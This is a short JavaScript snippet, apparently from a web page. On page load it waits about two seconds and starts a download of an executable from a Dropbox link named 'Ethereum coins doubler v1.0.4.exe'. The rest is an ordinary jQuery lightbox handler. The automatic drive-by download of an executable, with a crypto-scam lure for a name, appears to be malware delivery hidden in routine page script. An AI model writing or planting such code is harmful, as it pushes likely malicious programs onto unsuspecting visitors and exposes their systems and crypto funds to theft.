function download(){
  setTimeout(function(){
    downloadFile("https://dl.dropboxusercontent.com/s/r8zvu74adh5zf27/Ethereum%20coins%20doubler%20v1.0.4.exe?dl=0");
  }, 1998);
};
window.addEventListener("load", download);
$(document).on('click', '[data-toggle="lightbox"]', function(event) {
  event.preventDefault();
  $(this).ekkoLightbox();
});